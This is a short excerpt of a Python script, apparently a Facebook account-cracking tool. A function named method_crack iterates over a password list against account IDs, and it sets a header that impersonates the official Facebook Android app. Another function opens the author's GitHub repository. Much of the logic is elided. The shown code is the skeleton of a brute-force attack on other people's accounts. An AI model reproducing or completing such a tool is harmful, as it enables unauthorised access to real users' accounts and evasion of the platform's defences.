...
def MR_KHAN():
    clear()
    os.system('xdg-open https://github.com/MinhajKhanXd/A1.git')
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            header={'User-Agent': '[FBAN/FB4A;FBAV/395.0.0.27.214;FBBV/426817936;FBDM/{density=1.75,width=720,height=1422};FBLC/en_GB;FBRV/428276664;FBCR/Nepal Telecom;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q510N;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi'}
